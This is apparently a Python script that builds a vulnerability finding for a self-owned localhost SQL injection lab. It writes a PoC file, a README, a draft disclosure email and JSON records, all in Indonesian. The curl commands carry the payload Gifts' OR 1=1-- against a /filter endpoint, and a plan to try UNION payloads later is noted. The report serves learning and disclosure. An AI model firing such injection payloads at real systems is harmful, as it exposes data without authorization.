# -*- coding: utf-8 -*-
"""Bangun finding Recat untuk temuan SQLi lab localhost (atomik, finding.json terakhir)."""
import json, os, time

SRC = r"C:/Users/verzen/recat-workspace/finding/source"
PROJ = "localhost-sqli-lab"
SLUG = "sqli-filter-hidden-data-bypass"
FDIR = os.path.join(SRC, PROJ, "bug", "sqli-filter-hidden-data-bypass")
POC = os.path.join(FDIR := FDIR, "poc") if False else os.path.join(FDIR := os.path.join(SRC, PROJ, "bug", "sqli-filter-hidden-data-bypass"), "poc")

os.makedirs(POC, exist_ok=True)

def atomic(path, text):
    tmp = path + ".tmp"
    with open(tmp, "w", encoding="utf-8", newline="\n") as f:
        f.write(text)
    os.replace(tmp, path)
    print("OK :", path)

# ---------- poc/poc_request.txt ----------
atomic(os.path.join(POC, "poc_request.txt"), """# PoC — SQL Injection pada /filter (lab localhost, milik sendiri)
# Prasyarat: python sqli_app.py berjalan di http://127.0.0.1:8010

# 1) Perilaku normal (2 produk rilis, kategori Gifts):
curl "http://127.0.0.1:8010/filter?kategori=Gifts"

# 2) Payload SQLi (URL-encoded):
curl "http://127.0.0.1:8010/filter?kategori=Gifts%27%20OR%201=1--"

# Query yang terbentuk di server (tercetak di terminal server):
#   [QUERY] SELECT * FROM products WHERE kategori = 'Gifts' OR 1=1--' AND released = 1

# Hasil teramati (response HTML, diuraikan):
#   - normal : 2 baris produk (id 1, 2)
#   - payload: 9 baris produk, termasuk 3 baris TERSEMBUNYI (released = 0):
#       id 7 : Voucher Tak Terbatas (RAHASIA)
#       id 8 : Prototipe Hoodie Dev
#       id 9 : Flag{sql_injection_pemula}   <- bukti penembusan
""")

# ---------- README.md ----------
atomic(os.path.join(FDIR, "README.md"), """# SQL Injection pada filter kategori — membocorkan produk tersembunyi

**ID:** web-001 | **Status:** CONFIRMED (diverifikasi langsung oleh penguji, 3 Okt 2026)
**Target:** aplikasi lab milik sendiri (`~/Desktop/belajar-coding/lab-sqli/sqli_app.py`, localhost:8010)
**Kelas:** SQL Injection (CWE-89) | **Severity:** Medium (CVSS 5.3)

## Ringkasan
Parameter `kategori` pada `GET /filter` digabung langsung ke query SQL tanpa
parameterisasi. Payload `Gifts' OR 1=1--` mematikan kondisi `released = 1`
sehingga produk tersembunyi (belum rilis / internal) ikut ditampilkan.

## Bukti (terverifikasi sendiri, bukan laporan pihak lain)
- Penguji: Aldi + Hermes Agent (sesi 3 Okt 2026), dijalankan via curl dan browser.
- Response normal: 2 produk. Response dengan payload: 9 produk (semua), termasuk
  3 baris tersembunyi dan flag `Flag{sql_injection_pemula}`.
- Query yang terbentuk tercatat di log server: `WHERE kategori = 'Gifts' OR 1=1--' ...`.

## Deliverability
Tercapai tanpa autentikasi, tanpa interaksi user, satu HTTP GET langsung
(URL-encoded). Tidak ada prasyarat khusus. Semua ini DEMONSTRASI penuh.

## Data exposure
Terbukti: 3 rekaman "rahasia" (voucher internal, prototipe, flag) ikut tampil.
Belum diuji: pembacaan tabel lain (users/password hash) dengan payload UNION —
direncanakan di lab berikutnya.

## Harm (demonstrasi vs potensi)
- Terbukti: kebocoran data tersembunyi (confidentiality, terbatas).
- Potensi (belum didemonstrasikan): ekspansi ke tabel lain (users/hash),
  modifikasi data — SQLi pada titik yang sama lazim dapat dikembangkan.

## Skor CVSS (provisional, v3.1)
5.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
Rasio: dampak terbukti terbatas pada kerahasiaan sebagian rekaman (C:L);
eksploitasi lanjutan (baca tabel lain) belum didemonstrasikan sehingga C:H
tidak diklaim.

## Langkah reproduksi
1. `python sqli_app.py` (port 8010)
2. `curl "http://127.0.0.1:8010/filter?kategori=Gifts"` -> 2 produk
3. `curl "http://127.0.0.1:8010/filter?kategori=Gifts%27%20OR%201=1--"` -> 9 produk

## Rekomendasi
Parameterized query (`?` placeholder), whitelist kategori, least-privilege DB.

## Rekomendasi tindak lanjut (belum dikerjakan)
- [ ] Uji payload UNION untuk baca tabel lain (di lab, bukan produksi)
- [ ] Buat versi aplikasi yang sudah diperbaiki sebagai perbandingan
""")

# ---------- PASTE_EMAIL_READY.md ----------
atomic(os.path.join(FDIR, "PASTE_EMAIL_READY.md"), """# Draf Laporan Siap Salin (draft — TIDAK dikirim otomatis)

Subjek: [Report] SQL Injection pada filter kategori — data leak produk tersembunyi (web-001)

Hi Tim Keamanan,

Ringkasan: Parameter `kategori` pada endpoint /filter rentan SQL Injection.
Filter `released = 1` dapat dimatikan dengan payload `Gifts' OR 1=1--`,
membocorkan produk yang seharusnya tersembunyi.

Aset terdampak: GET /filter?kategori=<input> (aplikasi web, HTTP GET)

Dampak: Pengunjung tanpa akun dapat membaca record yang disaring aplikasi
(termasuk data internal/belum rilis). Pada sistem nyata pola yang sama
berpotensi membaca tabel lain.

Langkah reproduksi:
1. GET /filter?kategori=Gifts          -> 2 produk
2. GET /filter?kategori=Gifts%27%20OR%201=1--  -> 9 produk (termasuk rahasia)

Bukti: lihat README.md dan poc/poc_request.txt di folder finding.

Rekomendasi: parameterized query + whitelist kategori.

Hormat saya,
Aldi
""")

# ---------- verification.json ----------
atomic(os.path.join(FDIR, "verification.json"), json.dumps({
    "verified_by": "Aldi + Hermes Agent (sesi lokal 2026-10-03)",
    "methods": ["curl HTTP GET", "inspeksi respons HTML", "log query server"],
    "outcome": "confirmed",
    "checks": [
        "Baseline /filter?kategori=Gifts -> 2 produk",
        "Payload Gifts%27%20OR%201=1-- -> 9 produk (termasuk flag)",
        "Query SQL tercatat di stdout server membuktikan injeksi"
    ],
    "limitations": "Escalation (UNION baca tabel lain) belum diuji; hanya localhost lab."
}, indent=2))

# ---------- finding.json (TERAKHIR, sesuai aturan skill) ----------
atomic(os.path.join(FDIR, "finding.json"), json.dumps({
    "id": "web-001",
    "title": "SQL Injection pada filter kategori membocorkan produk tersembunyi",
    "asset_type": "web",
    "vulnerability_type": "SQL Injection",
    "severity": "medium",
    "status": "confirmed",
    "verified": True,
    "found_at": "2026-10-03T09:00:00Z",
    "url": "http://127.0.0.1:8010/filter",
    "host": "127.0.0.1:8010",
    "parameter": "kategori",
    "method": "GET",
    "impact": "Filter 'released=1' dapat dimatikan sehingga data tersembunyi (produk belum rilis/flag internal) terbaca tanpa autentikasi.",
    "deliverability": "Satu HTTP GET tanpa auth, tanpa interaksi user; payload dikirim via parameter URL. Terverifikasi langsung via curl.",
    "data_exposure": "3 dari 9 record produk tersembunyi terbukti bocor (termasuk flag internal). Pembacaan tabel lain (users, dsb.) belum diuji.",
    "harm": "Terbukti: disclosure data internal tanpa izin. Potensi (belum diuji): ekspansi UNION ke tabel sensitif (kredensial/hash) jika pola yang sama berlaku.",
    "cvss_score": 5.3,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    "steps_to_reproduce": [
        "Jalankan lab: python sqli_app.py (port 8010)",
        "curl 'http://127.0.0.1:8010/filter?kategori=Gifts' -> 2 produk",
        "curl 'http://127.0.0.1:8010/filter?kategori=Gifts%27%20OR%201=1--'",
        "Respons memuat 9 produk termasuk Flag{sql_injection_pemula}"
    ],
    "payload": "Gifts' OR 1=1--",
    "evidence": [
        "README.md",
        "PASTE_EMAIL_READY.md",
        "poc/poc_request.txt",
        "verification.json"
    ]
}, indent=2, ensure_ascii=False))

print("\nSelesai. Recat membaca folder source tiap 5 detik — cek dashboard.")
